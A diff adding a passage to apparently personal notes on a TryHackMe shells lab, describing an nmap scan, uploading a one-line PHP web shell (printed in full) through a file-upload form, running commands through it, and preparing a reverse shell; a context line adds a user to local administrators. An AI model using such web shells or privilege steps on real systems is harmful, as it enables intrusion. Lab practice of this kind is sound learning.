@@ -364,7 +364,29 @@ net localgroup administrators <username> /add
 
 13.Practice and Examples
 
+I started the linux practice box and connected via openvpn to the tryhackme network and then i used ssh with the infos of the task 14.Then i looked up with nmap the 
+1024 common ports and i got informations about that the port 22 and 80 is open.I opened the browser and typed in the machine_ip.
+On the website i have the possibility to click the browse button to choose a file and then submit it.When i wann initiate a reverse connection i have to open the uploaded 
+file then with machine_ip/uploads/xxx or look it up in the folder machine_ip/uploads in the browser.
 
+I wrote following code from the task with the webshells in a shell.php file and uploaded it.
+
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+
+
+Then i opened the website and used the ifconfig to see if it works like the example in the previous tasks.
+http://x.x.x.x/uploads/shell.php?cmd=ifconfig
+
+I can change the ifconfig for example to whoami and get the info that the user is www-data.
+http://x.x.x.x/uploads/shell.php?cmd=whoami
+
+For the next task we browse to the file php-reverse-shell.php in the folder /usr/share/webshells/php/ and then we edit it to change the ip to our tun0 ( the ip we get with our
+machine when we use openvpn to connect to the tryhackme network) and the port (i choose something above 1024).When u edit the file with nano in the terminal dont forget to use
+sudo because it is a write protected file.
+
+When we modified the file we can upload it and before we browse and open the file 
+
+<break for food :)>
 
 14.Linux Practice Box
 
